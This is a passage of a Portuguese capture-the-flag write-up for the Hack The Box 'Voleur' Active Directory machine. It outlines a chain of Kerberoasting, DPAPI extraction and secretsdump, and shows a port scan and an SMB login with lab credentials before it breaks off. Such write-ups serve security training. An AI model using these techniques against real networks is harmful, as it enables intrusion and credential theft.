<!doctype html><html lang=PT-BR dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=true><head><meta charset=utf-8><meta http-equiv=content-language content="pt-br"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>Voleur - HTB &#183; CatOverflow</title><meta name=title content="Voleur - HTB &#183; CatOverflow"><meta name=description content="As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt"><meta name=keywords content="Windows,Medium,HTB,"><link rel=canonical href=https://richard-natan.github.io/CatOverflow/writeups/voleur-htb/><meta name=author content="Richard Silva"><link href=https://github.com/richard-natan rel=me><link href=https://linkedin.com/in/richard-natan rel=me><meta property="og:url" content="https://richard-natan.github.io/CatOverflow/writeups/voleur-htb/"><meta property="og:site_name" content="CatOverflow"><meta property="og:title" content="Voleur - HTB"><meta property="og:description" content="As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt"><meta property="og:locale" content="pt_br"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2025-10-30T00:00:00+00:00"><meta property="article:modified_time" content="2025-10-30T00:00:00+00:00"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Medium"><meta property="article:tag" content="HTB"><meta property="og:image" content="https://richard-natan.github.io/CatOverflow/writeups/voleur-htb/featured.webp"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://richard-natan.github.io/CatOverflow/writeups/voleur-htb/featured.webp"><meta name=twitter:title content="Voleur - HTB"><meta name=twitter:description content="As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt"><link type=text/css rel=stylesheet href=/CatOverflow/css/main.bundle.min.29b1b652b273686f225077d2921fd88e263f083236da8ff2a7949bb3b5dc5823ce6fe0dbcafd35a78c54867ee7d62a9b4a971eb2140de6b419c9826bbb7e21c2.css integrity="sha512-KbG2UrJzaG8iUHfSkh/YjiY/CDI22o/yp5Sbs7XcWCPOb+Dbyv01p4xUhn7n1iqbSpceshQN5rQZyYJru34hwg=="><script type=text/javascript src=/CatOverflow/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js integrity="sha512-b0EXSzoFtoCCD+CMrb+l+3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script><script type=text/javascript src=/CatOverflow/js/zen-mode.min.9814dee9614d32aeb56239d118edfe20acd6231424f9b19c2dd48835038414130a5e946c0d1c9087d60e60e31840c9babfd217e3d4b95643dc8d651a71ccdf4a.js integrity="sha512-mBTe6WFNMq61YjnRGO3+IKzWIxQk+bGcLdSINQOEFBMKXpRsDRyQh9YOYOMYQMm6v9IX49S5VkPcjWUacczfSg=="></script><script src=/CatOverflow/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><script defer type=text/javascript id=script-bundle src=/CatOverflow/js/main.bundle.min.9cc802d09f28c6af56ceee7bc6e320a39251fdae98243f2a9942f221ac57a9f49c51609699a91794a7b2580ee1deaa8e4d794a68ffa94aa317c66e893ce51e02.js integrity="sha512-nMgC0J8oxq9Wzu57xuMgo5JR/a6YJD8qmULyIaxXqfScUWCWmakXlKeyWA7h3qqOTXlKaP+pSqMXxm6JPOUeAg==" data-copy=Copiar data-copied=Copiado></script><script src=/CatOverflow/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script><link rel=apple-touch-icon sizes=180x180 href=/CatOverflow/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/CatOverflow/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/CatOverflow/favicon-16x16.png><link rel=manifest href=/CatOverflow/site.webmanifest><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Writeups","name":"Voleur - HTB","headline":"Voleur - HTB","abstract":"As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor \/ HollowOct31Nyt","inLanguage":"pt-br","url":"https:\/\/richard-natan.github.io\/CatOverflow\/writeups\/voleur-htb\/","author":{"@type":"Person","name":"Richard Silva"},"copyrightYear":"2025","dateCreated":"2025-10-30T00:00:00\u002b00:00","datePublished":"2025-10-30T00:00:00\u002b00:00","dateModified":"2025-10-30T00:00:00\u002b00:00","keywords":["Windows","Medium","HTB"],"mainEntityOfPage":"true","wordCount":"3224"}]</script></head><body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
Ir para o conteúdo principal</a></div><div class="main-menu flex items-center justify-between py-6 md:justify-start gap-x-3 pt-[2px] pr-2 md:pr-4 pb-[3px] pl-0"><div><a href=/CatOverflow/ class=flex><span class=sr-only>CatOverflow</span>
<img src=/CatOverflow/images/logo.png width=512 height=512 class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt></a></div><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/CatOverflow/ class="text-base font-medium">CatOverflow</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/CatOverflow/writeups/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=Writeups title=Writeups><p class="text-base font-medium">Writeups</p></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Pesquisar (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Pesquisar (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></button>
<button id=appearance-switcher-mobile aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400 me-1"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></div><div class="-my-2 md:hidden"><div id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none text-end max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/CatOverflow/writeups/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=Writeups title=Writeups><p class="text-bg font-bg">Writeups</p></a></li></ul></div></div></div></div><div class="relative flex flex-col grow"><main id=main-content class=grow><article><header id=single_header class="mt-5 max-w-prose"><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">Voleur - HTB</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2025-10-30T00:00:00+00:00>30 outubro 2025</time><span class="px-2 text-primary-500">&#183;</span><span>3224 palavras</span><span class="px-2 text-primary-500">&#183;</span><span title="Tempo de leitura">16 minutos</span><span class="px-2 text-primary-500">&#183;</span><span class=mb-[2px]>
<span id=zen-mode-button class="text-lg hover:text-primary-500" title data-title-i18n-disable data-title-i18n-enable><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 50 50" width="50" height="50"><path fill="currentColor" d="M12.980469 4C9.1204688 4 5.9804688 7.14 5.9804688 11L6 26H9.9804688V11c0-1.65 1.3400002-3 3.0000002-3H40.019531c1.66.0 3 1.35 3 3V39c0 1.65-1.34 3-3 3H29c0 1.54-.579062 2.94-1.539062 4H40.019531c3.86.0 7-3.14 7-7V11c0-3.86-3.14-7-7-7H12.980469zM7 28c-2.206.0-4 1.794-4 4V42c0 2.206 1.794 4 4 4H23c2.206.0 4-1.794 4-4V32c0-2.206-1.794-4-4-4H7zm0 4H23L23.001953 42H7V32z"/></svg></span></span></span></span></div><div class="flex flex-row flex-wrap items-center"><a class="relative mt-[0.5rem] me-2" href=/CatOverflow/tags/windows/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Windows
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/CatOverflow/tags/medium/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Medium
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/CatOverflow/tags/htb/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">HTB</span></span></a></div></div><div class="flex author"><img class="!mt-0 !mb-0 h-24 w-24 rounded-full me-4" width=96 height=96 alt="Richard Silva" src=/CatOverflow/57724021_4528817659998141750_hu_446129f69c09faa3.png data-zoom-src=/CatOverflow/57724021_4528817659998141750.png><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">Autor</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">Richard Silva</div><div class="text-sm text-neutral-700 dark:text-neutral-400">Pentester | eJPTv2 | CRTA | Red Team</div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://github.com/richard-natan target=_blank aria-label=Github title=Github rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://linkedin.com/in/richard-natan target=_blank aria-label=Linkedin title=Linkedin rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg></span></span></a></div></div></div></div><div class=mb-5></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="order-first lg:ml-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs"><div class="toc ps-5 print:hidden lg:sticky lg:top-10"><details open id=TOCView class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg -ms-5 ps-5 pe-2 hidden lg:block"><summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Tabela de conteúdos</summary><div class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#resumo>Resumo</a></li><li><a href=#user-flag>User Flag</a><ul><li><a href=#recon-inicial>Recon Inicial</a><ul><li><a href=#brutando-o-arquivo-xlsx-e-obtendo-a-senha-do-svc_-e-svc_iis>Brutando o arquivo XLSX e obtendo a senha do <strong>SVC_LDAP</strong> e SVC_IIS</a></li><li><a href=#utilizando-de-um-kerberoasting-para-obter-o-svc_winrm>Utilizando de um Kerberoasting para obter o SVC_WINRM</a></li></ul></li></ul></li><li><a href=#root-flag>Root Flag</a><ul><li><a href=#obtendo-a-shell-do-svc_ldap>Obtendo a shell do SVC_LDAP</a></li><li><a href=#restaurando-o-usuário-toddwolfe>Restaurando o usuário TODD.WOLFE</a></li><li><a href=#extraindo-o-dpapi-do-toddwolfe-para-obter-a-senha-do-jeremycombs>Extraindo o DPAPI do TODD.WOLFE para obter a senha do JEREMY.COMBS</a></li><li><a href=#obtendo-a-chave-do-ssh-e-obtendo-a-hash-do-administrator>Obtendo a chave do SSH e obtendo a hash do Administrator</a></li></ul></li></ul></nav></div></details><details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden"><summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Tabela de conteúdos</summary><div class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#resumo>Resumo</a></li><li><a href=#user-flag>User Flag</a><ul><li><a href=#recon-inicial>Recon Inicial</a><ul><li><a href=#brutando-o-arquivo-xlsx-e-obtendo-a-senha-do-svc_-e-svc_iis>Brutando o arquivo XLSX e obtendo a senha do <strong>SVC_LDAP</strong> e SVC_IIS</a></li><li><a href=#utilizando-de-um-kerberoasting-para-obter-o-svc_winrm>Utilizando de um Kerberoasting para obter o SVC_WINRM</a></li></ul></li></ul></li><li><a href=#root-flag>Root Flag</a><ul><li><a href=#obtendo-a-shell-do-svc_ldap>Obtendo a shell do SVC_LDAP</a></li><li><a href=#restaurando-o-usuário-toddwolfe>Restaurando o usuário TODD.WOLFE</a></li><li><a href=#extraindo-o-dpapi-do-toddwolfe-para-obter-a-senha-do-jeremycombs>Extraindo o DPAPI do TODD.WOLFE para obter a senha do JEREMY.COMBS</a></li><li><a href=#obtendo-a-chave-do-ssh-e-obtendo-a-hash-do-administrator>Obtendo a chave do SSH e obtendo a hash do Administrator</a></li></ul></li></ul></nav></div></details></div></div><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><h2 class="relative group">Resumo<div id=resumo class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#resumo aria-label=Âncora>#</a></span></h2><p>A Voleur é uma máquina de nível Medium focada em <strong>Windows/Active Directory (AD)</strong>. É uma máquina divertida pois ela possui diversos passos interessantes de se explorar. Iniciamos com um usuário que nos permite acessar uma share do SMB que contém um arquivo com senha que contém credenciais de duas contas de serviços no AD. Com uma dessas contas conseguimos realizar um ataque de <code>Kerberoasting</code> e acesso a outra conta de serviço. Outra conta de serviço obtida anteriormente permite nós restaurarmos um usuário deletado que contém um DPAPI com dados salvos. Dentro desse DPAPI conseguimos credenciais de outro usuário que leva a uma chave SSH, e por fim, conseguimos realizar um <code>Secretsdump</code> para obter a hash do <strong>Administrator</strong>.</p><h2 class="relative group">User Flag<div id=user-flag class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#user-flag aria-label=Âncora>#</a></span></h2><h3 class="relative group">Recon Inicial<div id=recon-inicial class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#recon-inicial aria-label=Âncora>#</a></span></h3><h4 class="relative group">Brutando o arquivo XLSX e obtendo a senha do <strong>SVC_LDAP</strong> e SVC_IIS<div id=brutando-o-arquivo-xlsx-e-obtendo-a-senha-do-svc_-e-svc_iis class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#brutando-o-arquivo-xlsx-e-obtendo-a-senha-do-svc_-e-svc_iis aria-label=Âncora>#</a></span></h4><p>Como descrito na descrição da box, ja iniciamos com um usuário e senha: <code>ryan.naylor:HollowOct31Nyt</code>, usaremos ele para iniciar o recon e entender o que temos de disponivel para utilizar.</p><p>Como sempre, estarei utilizando o <a href=https://github.com/bee-san/RustScan target=_blank>Rustscan</a> pra realizar a enumeração inicial com o objetivo de encontrar portas abertas e o nome do AD/DOMAIN:</p><pre tabindex=0><code>&gt; rustscan -a 10.129.102.81 -u 5000 -- -sV

Nmap scan report for 10.10.11.76
Host is up, received echo-reply ttl 127 (0.15s latency).
Scanned at 2025-07-05 16:10:05 -03 for 58s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-06 03:10:12Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2222/tcp  open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
52560/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62338/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
62339/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62341/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62364/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
</code></pre><div class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"><span class="text-primary-400 pe-3 flex items-center"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417 293 53c-16.33-28-57.54-28-73.98.0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6c32.76.0 53.26-35 36.96-63zM232 168c0-13.25 10.75-24 24-24s24 10.8 24 24v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zm24 248c-17.36.0-31.44-14.08-31.44-31.44s14.07-31.44 31.44-31.44 31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
</span></span><span class=dark:text-neutral-300><strong>SEMPRE que rodar o Rustscan/Nmap, adicione o domain encontrado no seu arquivo <code>/etc/hosts</code> para não ter problemas de DNS. E SEMPRE que for possível, coloque o <code>dc.DOMINIO.htb</code> ANTES do <code>DOMINIO.htb</code>.</strong></span></div><p>Encontramos várias portas padrões de máquinas Windows, apenas uma chamou a minha atenção: a porta 2222 que está rodando um SSH, porém não temos como fazer nada por hora, então prosseguimos com a enumeração do AD usando o nosso usuário.</p><p>Ao tentar logar no SMB usando as credenciais disponibilizadas, descobrimos que a autenticação com <code>NTLM</code> está desativada, então para essa máquina precisaremos utilizar somente TGT/TGS para conseguir se autenticar no Kerberos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; nxc smb voleur.htb -u <span class=s1>&#39;ryan.naylor&#39;</span> -p <span class=s1>&#39;HollowOct31Nyt&#39;</span>
</span></span><span class=line><span class=cl>SMB         10.129.102.81   <span class=m>445</span>    10.129.102.81    <span class=o>[</span>*<span class=o>]</span>  x64 <span class=o>(</span>name:10.129.102.81<span class=o>)</span> <span class=o>(</span>domain:10.129.102.81<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span> <span class=o>(</span>NTLM:False<span class=o>)</span>
